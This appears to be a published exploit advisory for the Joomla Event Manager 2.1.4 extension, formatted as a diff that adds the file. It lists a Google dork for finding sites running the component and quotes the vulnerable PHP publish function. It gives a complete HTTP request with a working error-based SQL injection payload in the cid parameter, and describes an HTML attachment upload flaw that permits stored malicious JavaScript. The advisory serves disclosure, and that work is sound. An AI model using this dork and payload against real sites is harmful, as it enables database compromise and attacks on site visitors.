@@ -1,0 +1,71 @@
+# Exploit Title: Joomla Event Manager 2.1.4 - Multiple Vulnerabilities
+# Google Dork: inurl:option=com_jem
+# Date: 08-12-2015
+# Author: Martino Sani
+# Vendor Homepage: www.joomlaeventmanager.net
+# Software Link: www.joomlaeventmanager.net/download?download=50:jem-2-1-4-stable
+# Version: 2.1.4
+# CVE: -
+
+# VULNERABILITIES
+
+##1 SQL Injection
+
+  Resource: index.php?option=com_jem&view=myevents
+  Parameter: cid
+
+  Authenticated user can execute arbitrary SQL queries via SQL injection in the functionality that allows to publish/unpublish an event.
+
+### Source Code
+
+  File: sites/models/myevents.php
+
+  function publish($cid = array(), $publish = 1)
+  {
+     if (is_array($cid) && count($cid)) {
+        $cids = implode(',', $cid);
+  
+        $query = 'UPDATE #__jem_events'
+	  . ' SET published = '. (int) $publish
+	  . ' WHERE id IN ('. $cids .')'
+	  . ' AND (checked_out = 0 OR (checked_out = ' .$userid. '))';
+          
+        $this->_db->setQuery($query);
+     }
+  }
+
+### PoC
+
+  POST /joomla3.4.3/index.php?option=com_jem&view=myevents&Itemid=151 HTTP/1.1
+  Host: 127.0.0.1
+  User-Agent: Mozilla/5.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Referer: http://127.0.0.1/joomla3.4.3/index.php?option=com_jem&view=myevents&Itemid=151
+  Cookie: 55cfbe406ffe44b0159d9a943820d207=gauuoq0rqlakkltqj4dd1mpd76; jpanesliders_stat-pane=0; jpanesliders_event-sliders-10=2; d6300469df4ad94ccc019d02bc74f647=4339lu3g2tn4lhg2lvgd8ft263
+  Connection: keep-alive
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 352
+  
+  filter=1&filter_search=&limit=10&cid%5B%5D=1,2)%20AND%20(SELECT%206959%20FROM(SELECT%20COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)%20AND%20(1577=1577&filter_order=a.dates&filter_order_Dir=&enableemailaddress=0&boxchecked=1&task=myevents.unpublish&option=com_jem&5c597c6e06b1d6627024f147b562ecaf=1
+
+-------------------------------------------------------------------------------------------
+
+##2 Insecure File Upload
+
+  Default JEM settings allows to upload HTML/HTM files as event's attachment.
+  An authenticated attacker could upload malicious HTML/HTM files with malicious code (e.g. Javascript).
+  These attachments could be reachable on "<website>/media/com_jem/attachments/event/event[id]/" or downloaded and executed locally by the victim's browser.
+
+  Attachments process is handled by "/site/classes/attachments.class.php" file.
+  File types allowed by default are in the "/admin/sql/install.mysql.utf.sql" file.
+
+-------------------------------------------------------------------------------------------
+
+# NOTES
+
+  08-01-2015: Vendor notification.
+  08-12-2015: Vendor fixes the issues in the development branch.
+
+  The author is not responsible for the misuse of the information provided in this security advisory.
